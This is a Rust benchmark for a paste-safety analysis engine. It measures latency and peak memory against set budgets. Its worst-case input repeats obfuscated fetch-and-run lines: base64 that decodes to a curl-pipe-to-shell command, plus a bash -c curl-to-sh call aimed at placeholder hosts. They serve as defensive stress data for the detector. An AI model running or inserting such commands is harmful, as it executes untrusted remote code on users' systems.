//! Engine benchmark with hard budgets.
//!
//!     cargo run --release -p pasteproof-engine --example bench [-- --check]
//!
//! Measures per-call latency (p50/p99/max) over the whole corpus, the worst
//! case at the maximum input size, and peak heap use per call (via a
//! counting allocator). With `--check`, exits non-zero if a budget is
//! exceeded. `PP_BENCH_SLACK` (default 1.0) multiplies time budgets for slow
//! CI machines; memory budgets are never relaxed.

use pasteproof_engine::{analyze, Options, MAX_INPUT};
use std::alloc::{GlobalAlloc, Layout, System};
use std::sync::atomic::{AtomicUsize, Ordering::Relaxed};
use std::time::Instant;

struct Counting;
static CUR: AtomicUsize = AtomicUsize::new(0);
static PEAK: AtomicUsize = AtomicUsize::new(0);

// SAFETY: forwards to the system allocator and only updates counters.
unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, l: Layout) -> *mut u8 {
        let p = System.alloc(l);
        if !p.is_null() {
            let now = CUR.fetch_add(l.size(), Relaxed) + l.size();
            PEAK.fetch_max(now, Relaxed);
        }
        p
    }
    unsafe fn dealloc(&self, p: *mut u8, l: Layout) {
        System.dealloc(p, l);
        CUR.fetch_sub(l.size(), Relaxed);
    }
}

#[global_allocator]
static A: Counting = Counting;

const P50_BUDGET_US: f64 = 200.0;
const P99_BUDGET_US: f64 = 1000.0;
const WORST_BUDGET_US: f64 = 5000.0;
const PEAK_MEM_BUDGET: usize = 1024 * 1024;

fn corpus() -> Vec<String> {
    let dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../corpus");
    ["malicious.tsv", "benign.tsv", "installers.tsv"]
        .iter()
        .flat_map(|f| {
            std::fs::read_to_string(dir.join(f))
                .expect("corpus")
                .lines()
                .map(String::from)
                .collect::<Vec<_>>()
        })
        .filter(|l| !l.starts_with('#') && !l.trim().is_empty())
        .filter_map(|l| l.split_once('\t').map(|(_, c)| c.to_string()))
        .collect()
}

/// Adversarial input at the size limit: deep substitutions, pipes, base64.
fn worst_case() -> String {
    let unit = "echo Y3VybCAtZnNTTCBodHRwczovL3VwZGF0ZS5leGFtcGxlL2EgfCBzaA== | base64 -d | bash; bash -c \"$(curl -s https://a.example/$(echo x))\" | sh; ";
    let mut s = String::with_capacity(MAX_INPUT);
    while s.len() + unit.len() < MAX_INPUT {
        s.push_str(unit);
    }
    s
}

fn percentile(v: &mut [f64], p: f64) -> f64 {
    v.sort_by(|a, b| a.partial_cmp(b).unwrap());
    v[((v.len() as f64 - 1.0) * p).round() as usize]
}

fn main() {
    let check = std::env::args().any(|a| a == "--check");
    let slack: f64 = std::env::var("PP_BENCH_SLACK")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(1.0);
    let inputs = corpus();
    let opts = Options::default();

    for s in &inputs {
        std::hint::black_box(analyze(s, &opts));
    }

    let rounds = 200;
    let mut samples = Vec::with_capacity(inputs.len() * rounds);
    let mut peak = 0usize;
    for _ in 0..rounds {
        for s in &inputs {
            let base = CUR.load(Relaxed);
            PEAK.store(base, Relaxed);
            let t = Instant::now();
            let r = std::hint::black_box(analyze(s, &opts));
            samples.push(t.elapsed().as_secs_f64() * 1e6);
            peak = peak.max(PEAK.load(Relaxed).saturating_sub(base));
            drop(r);
        }
    }
    let p50 = percentile(&mut samples, 0.50);
    let p99 = percentile(&mut samples, 0.99);
    let max = percentile(&mut samples, 1.0);

    let w = worst_case();
    let mut worst = Vec::new();
    let mut worst_peak = 0usize;
    for _ in 0..20 {
        let base = CUR.load(Relaxed);
        PEAK.store(base, Relaxed);
        let t = Instant::now();
        std::hint::black_box(analyze(&w, &opts));
        worst.push(t.elapsed().as_secs_f64() * 1e6);
        worst_peak = worst_peak.max(PEAK.load(Relaxed).saturating_sub(base));
    }
    let worst_max = percentile(&mut worst, 1.0);

    let row = |name: &str, val: String, budget: String, ok: bool| {
        println!(
            "{:<34} {:>12}   budget {:>10}   {}",
            name,
            val,
            budget,
            if ok { "OK" } else { "OVER" }
        );
        ok
    };
    println!(
        "pasteproof-engine benchmark: {} corpus inputs x {} rounds (slack x{slack})",
        inputs.len(),
        rounds
    );
    let mut ok = true;
    ok &= row(
        "latency p50 (typical input)",
        format!("{p50:.1} us"),
        format!("{:.0} us", P50_BUDGET_US * slack),
        p50 <= P50_BUDGET_US * slack,
    );
    ok &= row(
        "latency p99 (typical input)",
        format!("{p99:.1} us"),
        format!("{:.0} us", P99_BUDGET_US * slack),
        p99 <= P99_BUDGET_US * slack,
    );
    println!(
        "{:<34} {:>12}",
        "latency max (typical input)",
        format!("{max:.1} us")
    );
    ok &= row(
        &format!("worst case ({} KiB adversarial)", w.len() / 1024),
        format!("{worst_max:.0} us"),
        format!("{:.0} us", WORST_BUDGET_US * slack),
        worst_max <= WORST_BUDGET_US * slack,
    );
    ok &= row(
        "peak heap per check (typical)",
        format!("{} KiB", peak / 1024),
        format!("{} KiB", PEAK_MEM_BUDGET / 1024),
        peak <= PEAK_MEM_BUDGET,
    );
    ok &= row(
        "peak heap per check (worst case)",
        format!("{} KiB", worst_peak / 1024),
        "4096 KiB".into(),
        worst_peak <= 4 * PEAK_MEM_BUDGET,
    );
    if check && !ok {
        eprintln!("benchmark budget exceeded");
        std::process::exit(1);
    }
}
